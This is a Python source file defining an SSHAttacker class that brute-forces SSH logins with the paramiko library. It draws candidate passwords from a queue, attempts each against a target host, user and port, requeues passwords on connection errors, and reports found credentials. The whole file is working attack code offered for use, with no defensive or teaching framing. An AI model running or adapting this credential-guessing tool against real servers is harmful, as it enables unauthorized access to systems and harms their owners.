import paramiko
from target import Target, Attacker


class SSHAttacker(Attacker):
    def __init__(self, target: Target):
        super().__init__(target)

    def run(self):
        while SSHAttacker.finish is False:
            password = self.get_password()
            if password is None:
                continue

            try:
                sshclient = paramiko.SSHClient()
                sshclient.set_missing_host_key_policy(paramiko.AutoAddPolicy())

                sshclient.connect(
                    hostname=self.target.host,
                    port=self.target.port,
                    username=self.target.login,
                    timeout=3,
                    password=password,
                    allow_agent=False,
                    look_for_keys=False
                )
            except paramiko.AuthenticationException:
                self.tries += 1
                print("[%s] Failed attempt against %s - user: %s, password: %s" %
                      (self.name, self.target.host, self.target.login, password))

            except paramiko.SSHException:
                print("[%s] Connection error - %s" % (self.name, self.target.host))
                self.target.passwords.put(password)

            except Exception:
                print("[%s] Unknown exception while connecting to %s" %
                      (self.name, self.target.host))
                self.target.passwords.put(password)

            else:
                self.tries += 1
                SSHAttacker.finish = True
                SSHAttacker.password = password
                SSHAttacker.success = True
                print("[%s] Found credentials for %s - user: %s, password: %s" %
                      (self.name, self.target.host, self.target.login, password))

            finally:
                sshclient.close()
